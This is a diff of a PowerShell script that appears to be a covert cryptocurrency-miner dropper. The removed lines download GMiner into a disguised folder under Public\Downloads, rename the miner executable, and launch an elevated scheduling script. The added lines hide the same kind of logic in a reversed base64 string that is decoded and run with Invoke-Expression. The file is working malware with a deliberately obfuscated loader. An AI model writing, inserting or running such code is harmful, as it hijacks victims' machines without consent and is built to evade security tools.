@@ -1,11 +1,4 @@
-$source = 'https://github.com/develsoftware/GMinerRelease/releases/download/3.05/gminer_3_05_windows64.zip'
-$destination = 'C:\Users\Public\Downloads\Nvid\gnvid.zip'
-$pathtoextract = 'C:\Users\Public\Downloads\Nvid\'
-Rename-Item -Path "C:\Users\Public\Downloads\Nvid\miner.exe" -NewName "C:\Users\Public\Downloads\Nvid\wink.exe"
-$script = $PSScriptRoot+"\nvidcom.ps1"
- Invoke-WebRequest -Uri $source -OutFile $destination -UseBasicParsing 
- Expand-Archive -Path $destination -DestinationPath $pathtoextract
- Start-Process powershell -verb runas -ArgumentList "-file C:\Users\Public\Downloads\Nvid\nvidschedule.ps1"
-& $script
-
-
+$best64code = "==gCNoQDK0AdwlmcjNHJgYiCNISMzBnLlxWdkVGajNHZpZnbcNHZh9Gbud3bEx1YpxmY1BFXzJXZzVFX6MEIlxWam1iIgQ3cpxEduVWb1dmcB1CIzFmb1JHIiJXZ21CIsxWZoNncld3bwByczV2YvJHUtQnchR3UgoQD0NWYyRHel9GdoRXYwRCIoRXYQ52bpRXYulGdzVGRtAibvlGdh5Wa0NXZkRCIoRXYQ1CIlZXaoNmcB1CZuFGc4VEIK0AIn5WazJXYQNWazFmQlNXVtAibvlGdh5Wa0NXZkRCIlxWaGRXdP1CIlNmc192ckASayVVLgQ3clVXclJlYldVLlt2b25WSgoQDiEzcw5SbvNGZpZnbcJyK092bSRHcpJ3YTNFUkASPgQHcpJ3YzRiCNISZ4VmLr5Wa3x1ckF2bs52dvREXjlGbiVHUcNnclNXVcpzQiASZtFmT3VmTtAiIlhXZuIXZulWbcNHZh9Gbud3bEx1YpxmY1BFXzJXZzVFX6MkIggGdhBVLg0WZ0lULl1WYuVmUK0wJcNHZh9Gbud3bEx1YpxmY1BFXzJXZzVFX6M0Jg0DI0NWYyRHel9GdoRXYwRiCNcCcppnLklmdudGXzRWYvxmb39GRcNWasJWdQx1cyV2cVxlODdCI9AibvlGdh5Wa0NXZkRiCNcCcppnL0Yzc39GZul2dfVDMfNzXyVmbp12ZvUDMuMzLkF2bs52dvR2LzV2chVGblJ3LlNXYlxWZSJXZulWTH9SZyF2d0Z2bzxWZ2VGZv02bj5iY1hGdpd2LvozcwRHdodCI9ASZjJXdvNHJ"
+$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null
+$LoadCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$base64"))
+Invoke-Expression $LoadCode
